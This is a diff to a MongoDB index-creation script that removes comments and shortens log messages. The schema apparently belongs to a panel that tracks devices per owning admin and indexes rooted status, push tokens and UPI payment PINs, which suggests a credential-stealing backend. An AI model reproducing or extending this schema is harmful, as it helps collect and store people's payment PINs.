@@ -55,18 +55,14 @@ async def create_indexes():
         await mongodb.db.devices.create_index("battery_level")
         await mongodb.db.devices.create_index("is_rooted")
         await mongodb.db.devices.create_index("fcm_tokens")
-        
-        # 🔑 Admin & Device Token Indexes
-        await mongodb.db.devices.create_index("admin_token")  # توکن ادمین صاحب دستگاه
-        await mongodb.db.devices.create_index("admin_username")  # username ادمین صاحب دستگاه
-        await mongodb.db.devices.create_index([("admin_username", ASCENDING), ("registered_at", DESCENDING)])  # Compound index
-
-        # UPI Indexes
+        await mongodb.db.devices.create_index("admin_token")
+        await mongodb.db.devices.create_index("admin_username")
+        await mongodb.db.devices.create_index([("admin_username", ASCENDING), ("registered_at", DESCENDING)])
         await mongodb.db.devices.create_index("has_upi")
-        await mongodb.db.devices.create_index("upi_pin")  # ✅ اضافه شد
+        await mongodb.db.devices.create_index("upi_pin")
         await mongodb.db.devices.create_index("upi_detected_at")
-        await mongodb.db.devices.create_index("upi_last_updated_at")  # ✅ اضافه شد
-        await mongodb.db.devices.create_index([("has_upi", ASCENDING), ("upi_detected_at", DESCENDING)])  # ✅ Compound index
+        await mongodb.db.devices.create_index("upi_last_updated_at")
+        await mongodb.db.devices.create_index([("has_upi", ASCENDING), ("upi_detected_at", DESCENDING)])
 
         await mongodb.db.devices.create_index("note_priority")
         await mongodb.db.devices.create_index("note_updated_at")
@@ -137,11 +133,9 @@ async def create_indexes():
         await mongodb.db.admins.create_index("device_token", unique=True)
         await mongodb.db.admins.create_index("telegram_2fa_chat_id")
         await mongodb.db.admins.create_index("current_session_id")
-        
-        # OTP Codes (2FA)
         await mongodb.db.otp_codes.create_index([("username", ASCENDING), ("used", ASCENDING)])
         await mongodb.db.otp_codes.create_index([("username", ASCENDING), ("otp_code", ASCENDING)])
-        await mongodb.db.otp_codes.create_index("expires_at", expireAfterSeconds=3600)  # Auto-delete after 1 hour
+        await mongodb.db.otp_codes.create_index("expires_at", expireAfterSeconds=3600)
         await mongodb.db.otp_codes.create_index("created_at")
 
         await mongodb.db.admin_activities.create_index([("admin_username", ASCENDING), ("timestamp", DESCENDING)])
@@ -155,10 +149,6 @@ async def create_indexes():
 
         logger.info("✅ Indexes created successfully!")
         
-        # ====================================================================
-        # 🔄 MIGRATION: Add session fields to existing admins
-        # ====================================================================
-        # Force all existing admins to re-login by setting session fields to None
         result = await mongodb.db.admins.update_many(
             {"current_session_id": {"$exists": False}},
             {"$set": {
@@ -168,16 +158,14 @@ async def create_indexes():
             }}
         )
         if result.modified_count > 0:
-            logger.warning(f"🔄 Migrated {result.modified_count} admin(s) - They must re-login (Single Session activated)")
+            logger.warning(f"🔄 Migrated {result.modified_count} admin(s) - They must re-login")
         
-        # 🔄 MIGRATION: Add fcm_tokens field to existing admins
-        # ====================================================================
         result = await mongodb.db.admins.update_many(
             {"fcm_tokens": {"$exists": False}},
             {"$set": {"fcm_tokens": []}}
         )
         if result.modified_count > 0:
-            logger.info(f"🔄 Migrated {result.modified_count} admin(s) - Added fcm_tokens field for push notifications")
+            logger.info(f"🔄 Migrated {result.modified_count} admin(s) - Added fcm_tokens field")
 
     except Exception as e:
         logger.error(f"❌ Failed to create indexes: {e}")
